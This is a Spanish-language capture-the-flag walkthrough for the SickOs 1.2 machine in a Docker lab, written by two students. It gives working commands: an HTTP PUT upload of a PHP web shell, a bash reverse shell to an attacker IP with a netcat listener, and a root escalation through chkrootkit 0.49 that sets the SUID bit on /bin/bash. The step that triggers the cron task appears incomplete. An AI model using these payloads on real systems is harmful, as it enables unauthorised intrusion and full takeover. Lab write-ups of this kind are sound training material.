# Write Up

## Componentes del grupo

Javier Merino Pinedo
Alejandro Nagore Irigoyen

## Guia de solución de la máquina

🏴‍☠️ Walkthrough: SickOs 1.2 (Docker Lab)
🎯 Objetivo
Obtener acceso a la máquina y leer la flag en /home/sickos/user.txt.
Escalar privilegios de acceso root y leer la flag en /root/root.txt.

🖥️ Preparativos (Tu máquina atacante)
Necesitas dos terminales abiertas en tu Linux/WSL.

Terminal 1: Para lanzar comandos de ataque (curl, crear archivos).

Terminal 2: Para recibir la conexión (Netcat).

### FASE 1: Reconocimiento (Enumeración)
Primero, comprobamos si el servidor web tiene alguna configuración insegura. Sabemos que la carpeta /test/ es sospechosa.

En tu Terminal 1:

```
curl -v -X OPTIONS http://localhost/test/
```
Lo que buscas: En la respuesta, la cabecera Allow debe incluir PUT.

Significado: Podemos subir archivos al servidor.

### FASE 2: Acceso Inicial (Reverse Shell)
Vamos a subir un script que obligue al servidor a conectarse a nosotros.

1. Consigue tu IP
Necesitas saber a dónde debe conectarse el servidor.

Bash
```
ip addr show eth0
```
# Copia la IP (ej. 172.17.0.1). La llamaremos TU_IP.
2. Crea el Payload (La bomba)
Crea un archivo llamado rev.sh en tu ordenador:

Bash

# Cambia TU_IP por la que copiaste antes
echo "bash -i >& /dev/tcp/TU_IP/4444 0>&1" > rev.sh
3. Crea el Trigger (El detonador)
Necesitamos un archivo PHP para ejecutar el script anterior.

Bash

echo '<?php system($_GET["cmd"]); ?>' > shell.php
4. Sube los archivos (Explotación PUT)
Usamos curl para subir ambos archivos a la carpeta vulnerable:

Bash

curl -v -T rev.sh http://localhost/test/rev.sh
curl -v -T shell.php http://localhost/test/shell.php
Alternativa (Paso 4.Alt):

Bash

curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://localhost/test/shell.php
5. Pon la oreja (Listener)
En tu Terminal 2: Ponte a escuchar en el puerto 4444.

Bash

nc -lvnp 4444
6. ¡Ejecuta!
En tu Terminal 1 (o navegador): Llama al archivo PHP y dile que ejecute el script de bash.

Bash

curl "http://localhost/test/shell.php?cmd=bash%20/var/www/html/test/rev.sh"
(El navegador se quedará cargando. Eso es buena señal).

FASE 3: Escalada de Privilegios (Becoming Root)
Ahora mira tu Terminal 2. Deberías tener un prompt como www-data@...$. Estás dentro, pero eres un usuario con pocos permisos.

1. Identificar la vulnerabilidad
Verificamos la versión de chkrootkit y si hay tareas programadas.

Bash

# En la Terminal 2 (dentro de la víctima)
/usr/sbin/chkrootkit -V
ls -la /etc/cron.daily/
Confirmamos versión 0.49 y que existe el script en cron.daily.

2. Preparar la trampa
Sabemos que si existe el archivo /tmp/update, chkrootkit lo ejecutará como root. Vamos a crear uno que le de superpoderes al comando bash.

Bash

# En la Terminal 2
cd /tmp
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > update
chmod +x update
3. Disparar el evento (Simulación de tiempo)
En un hackeo real, esperarías al día siguiente. Aquí, forzamos que el administrador ejecute la tarea diaria.

En tu Terminal 1 (Tu máquina, NO la víctima):

Bash

docker ps
# Busca el nombre que contenga "machine1" o "web-lab", ej: web-lab-machine1-1
(Verás mucho texto de escaneo. Espera a que termine).

FASE 4: Looting (La victoria)
Vuelve a tu Terminal 2 (donde eres www-data).

1. Comprobar permisos
Bash

ls -la /bin/bash
Debes ver: -rwsr-xr-x (¡La s es la clave!).

2. Hacerse Root
Bash

/bin/bash -p
whoami
Respuesta esperada: root.

3. Leer la Flag
Bash

cd /flag
ls
cat root.txt
